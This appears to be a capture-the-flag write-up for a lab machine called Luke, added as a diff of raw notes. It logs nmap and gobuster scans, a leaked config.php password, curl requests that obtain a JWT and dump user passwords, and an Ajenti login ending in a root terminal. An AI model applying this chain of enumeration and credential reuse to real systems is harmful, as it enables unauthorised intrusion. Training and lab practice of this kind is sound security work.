@@ -1,0 +1,250 @@
+kali@kali:~$ nmap -sC -sV 10.10.10.137
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 00:19 EDT
+Nmap scan report for 10.10.10.137
+Host is up (0.16s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.21
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session upload bandwidth limit
+|      No session download bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
+|_End of status
+22/tcp   open  ssh?
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 199.22 seconds
+
+
+
+
+
+kali@kali:~$ sudo nmap -sU -sT -T4 --max-retries 0 10.10.10.137
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 00:19 EDT
+Warning: 10.10.10.137 giving up on port because retransmission cap hit (0).
+Warning: 10.10.10.137 giving up on port because retransmission cap hit (0).
+Nmap scan report for 10.10.10.137
+Host is up (0.16s latency).
+Not shown: 819 closed ports, 752 filtered ports, 425 open|filtered ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+8000/tcp open  http-alt
+
+
+
+Dear Chihiro !!
+
+As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
+the actual website I've created .
+Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 
+
+Derry  
+
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.137:3000 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.137:3000
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/19 00:29:26 Starting gobuster
+===============================================================
+/login (Status: 200)
+/users (Status: 200)
+/Login (Status: 200)
+/Users (Status: 200)
+/LogIn (Status: 200)
+/LOGIN (Status: 200)
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.137 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.137
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/19 00:30:45 Starting gobuster
+===============================================================
+/member (Status: 301)
+/management (Status: 401)
+/css (Status: 301)
+/js (Status: 301)
+/vendor (Status: 301)
+/LICENSE (Status: 200)
+
+
+
+it's interesting the nmap shows it's php
+80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+
+let's scan it with php as well
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.137 -x php --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.137
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/07/19 01:04:26 Starting gobuster
+===============================================================
+/login.php (Status: 200)
+/member (Status: 301)
+/management (Status: 401)
+/css (Status: 301)
+/js (Status: 301)
+/vendor (Status: 301)
+/config.php (Status: 200)
+/LICENSE (Status: 200)
+
+found login.php and config.php
+$dbHost = 'localhost';
+$dbUsername = 'root';
+$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
+$db = "login";
+
+$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
+
+
+the password only works with the node js 
+
+kali@kali:/tmp$ curl -kv -H "Content-Type: application/json" -X POST -d@123 http://10.10.10.137:3000/login
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.10.137:3000...
+* TCP_NODELAY set
+* Connected to 10.10.10.137 (10.10.10.137) port 3000 (#0)
+> POST /login HTTP/1.1
+> Host: 10.10.10.137:3000
+> User-Agent: curl/7.68.0
+> Accept: */*
+> Content-Type: application/json
+> Content-Length: 50
+> 
+* upload completely sent off: 50 out of 50 bytes
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 219
+< ETag: W/"db-R+uLXrcWatXnIhSn/lNaHYDZAdU"
+< Date: Sun, 19 Jul 2020 05:30:28 GMT
+< Connection: keep-alive
+< 
+* Connection #0 to host 10.10.10.137 left intact
+{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTk1MTM2NjI4LCJleHAiOjE1OTUyMjMwMjh9.YsC45vvA6a5yOEVcLNH-03tAqIuMuuWzEgR_BV1Ntrg"}
+
+
+kali@kali:/tmp$ cat 123 | jq .
+{
+  "password": "Zk6heYCyv6ZE9Xcg",
+  "username": "admin"
+}
+
+
+
+kali@kali:/tmp$ curl -kv -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTk1MTM2NjI4LCJleHAiOjE1OTUyMjMwMjh9.YsC45vvA6a5yOEVcLNH-03tAqIuMuuWzEgR_BV1Ntrg" http://10.10.10.137:3000/users
+*   Trying 10.10.10.137:3000...
+* TCP_NODELAY set
+* Connected to 10.10.10.137 (10.10.10.137) port 3000 (#0)
+> GET /users HTTP/1.1
+> Host: 10.10.10.137:3000
+> User-Agent: curl/7.68.0
+> Accept: */*
+> Content-Type: application/json
+> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTk1MTM2NjI4LCJleHAiOjE1OTUyMjMwMjh9.YsC45vvA6a5yOEVcLNH-03tAqIuMuuWzEgR_BV1Ntrg
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 181
+< ETag: W/"b5-cGsywmWiRpCno11EZqocljZF8A8"
+< Date: Sun, 19 Jul 2020 05:32:56 GMT
+< Connection: keep-alive
+< 
+* Connection #0 to host 10.10.10.137 left intact
+[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
+
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.137:3000/users --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.137:3000/users
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/19 01:31:06 Starting gobuster
+===============================================================
+/admin (Status: 200)
+/Admin (Status: 200)
+
+go through more on the users shows probably it matches the user name
+
+we find admin pass and derry password 
+
+
+{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
+
+{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
+
+
+http://10.10.10.137/management/
+now this works with Derry's password
+
+
+inside we have config.json, which password for ajenti
+
+KpMasng6S5EtTy9Z
+
+now we finally login to ajenti
+
+it has option for terminal, which actually showd up in the config.json already
+
+start it, find out we are root
+
+
